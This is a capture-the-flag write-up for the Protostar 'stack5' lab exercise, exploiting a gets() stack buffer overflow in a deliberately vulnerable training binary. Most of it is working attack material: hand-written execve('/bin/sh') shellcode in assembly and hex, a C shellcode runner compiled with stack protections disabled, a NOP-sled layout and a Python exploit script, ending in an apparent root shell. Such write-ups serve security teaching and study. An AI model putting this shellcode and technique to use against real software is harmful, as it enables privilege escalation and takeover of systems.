# STACK 5

## SOURCE CODE

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);           // <- Buffer Overflow
}
```

## IDEA

- We can see that is code has Buffer Overflow vulnerability, but we does not have win or get shell function, so, I write my own shellcode by disassemble from nasm code and put it in stack of program with BOF vuln and execute shellcode to get the shell.

## DETAIL

- This assembly code which we use to inject to stack must not have 0x0 byte (or NULL byte), because we read the input as a string, so if it has 0x0 byte, the gets function just terminated at that byte. 

```asm
section .text:
	global _start:
_start:
  push 	0xb
  pop 	eax                ; mov 	eax, 0xb
  xor 	edx, edx     	   ; mov 	edx, 0

  push 	edx                ; mov 	eax, "/bin/sh"
  push 	0x68732f2f
  push 	0x6e69622f
  mov 	ebx, esp

  xor 	ecx, ecx           ; mov 	ecx, 0
  int 	0x80
```

- Objdump and I have shellcode of this assembly file

```asm
λ ~ \ objdump -M intel -D shellcode

shellcode:     file format elf32-i386


Disassembly of section .text::

08049000 <_start>:
 8049000:       6a 0b                   push   0xb
 8049002:       58                      pop    eax
 8049003:       31 d2                   xor    edx,edx
 8049005:       52                      push   edx
 8049006:       68 2f 2f 73 68          push   0x68732f2f
 804900b:       68 2f 62 69 6e          push   0x6e69622f
 8049010:       89 e3                   mov    ebx,esp
 8049012:       31 c9                   xor    ecx,ecx
 8049014:       cd 80                   int    0x80
```

- The shellcode

```
\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

- We can play something fun with this shellcode in C

```c
// filename: vuln.c
#include<stdio.h>

int main()
{
  char shellcode[] = "\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80";
   ( (void(*)())shellcode )();
  return 0;
}

// gcc -m32 -z execstack -fno-stack-protector -o vuln vuln.c
```

- Compile with flag execstack to enable stack execute shellcode and disable the stack protector to make shellcode work.

```
λ ~ \ gcc -m32 -z execstack -fno-stack-protector -o vuln vuln.c
λ ~ \ ./vuln
$ ls
vuln  vuln.c
$
```

- So the shellcode works pretty well. Let's check some informations and make some payload to exploit the vulnerability.

- The shellcode attack can understand by this below text

```
|                     from this                   to                    this
|                  .  .  .  .  .                                   .   .   .   .   .
|          +----------------------------+                   +----------------------------+
|          |                            |                   |                            |
|          |                            |                   |                            |
|          |    Content of function     |                   |    padding "aaaaaaaaa"     |
|          |                            |                   |                            |
S          |                            |                   |                            |
t          +----------------------------+                   +----------------------------+
a          |        EBP  Reserve        |                   |       padding "aaaa"       |
c          +----------------------------+         ->        +----------------------------+
k          |            RET             |                   |     address of RET + 75    |
|          +----------------------------+                   +----------------------------+
|          |                            |                   |                            |
|          |                            |                   | a bunch of "\x90" nopcode  |
|          |       some argument        |                   |     and after nopcode      |
|          |      of this function      |                   |        is shellcode        |
|          |                            |                   |                            |
|          +----------------------------+                   +----------------------------+
|                  .  .  .  .  .                                   .   .   .   .   .

```

```
(gdb) run
Starting program: /opt/protostar/bin/stack5

Breakpoint 1, main (argc=1, argv=0xbffffd54) at stack5/stack5.c:7
7       stack5/stack5.c: No such file or directory.
        in stack5/stack5.c
0x080483c4 <main+0>:     55     push   ebp
0x080483c5 <main+1>:     89 e5  mov    ebp,esp
0x080483c7 <main+3>:     83 e4 f0       and    esp,0xfffffff0
0x080483ca <main+6>:     83 ec 50       sub    esp,0x50
(gdb) x/40xw $esp
0xbffffcac:     0xb7eadc76      0x00000001      0xbffffd54      0xbffffd5c
0xbffffcbc:     0xb7fe1848      0xbffffd10      0xffffffff      0xb7ffeff4
0xbffffccc:     0x08048232      0x00000001      0xbffffd10      0xb7ff0626
0xbffffcdc:     0xb7fffab0      0xb7fe1b28      0xb7fd7ff4      0x00000000
0xbffffcec:     0x00000000      0xbffffd28      0xfc6b4546      0xd62a5356
0xbffffcfc:     0x00000000      0x00000000      0x00000000      0x00000001
0xbffffd0c:     0x08048310      0x00000000      0xb7ff6210      0xb7eadb9b
0xbffffd1c:     0xb7ffeff4      0x00000001      0x08048310      0x00000000
0xbffffd2c:     0x08048331      0x080483c4      0x00000001      0xbffffd54
0xbffffd3c:     0x080483f0      0x080483e0      0xb7ff1040      0xbffffd4c
```

- Before run into main function, I check the top of stack and we can see that the ret of main has address `0xbffffcac`, so I will place this with `0xbffffcac + 75 = 0xbffffcf7` and padding after RET is 200 bytes "\x90" that is nopcode, the purpose of this stuff is that address of main's RET can vary in a range address at each time we run the program. So we add 200 bytes of nopcode to increase the possibility to return to nopcode which will gled to shellcode.  

- Then I find offset to overwrite and finish the exploit file.

## EXPLOIT


```python
# filename: exp.py

payload = "a"*76

ret = "\xfc\xfc\xff\xbf"
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
payload +=  ret + "\x90"*200 + shellcode

print(payload)

# python epx.py > temp.pwn
# (cat temp.pwn; cat) | ./stack5
```

## RESULT

```
root@protostar:/opt/protostar/bin# (cat temp.pwn; cat) | ./stack5
ls
exp.py  final0  final1  final2  format0  format1  format2  format3  format4  heap0  heap1  heap2  heap3  net0  net1  net2  net3  net4  stack0  stack1  stack2  stack3  stack4  stack5  stack6  stack7  temp.pwn
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
```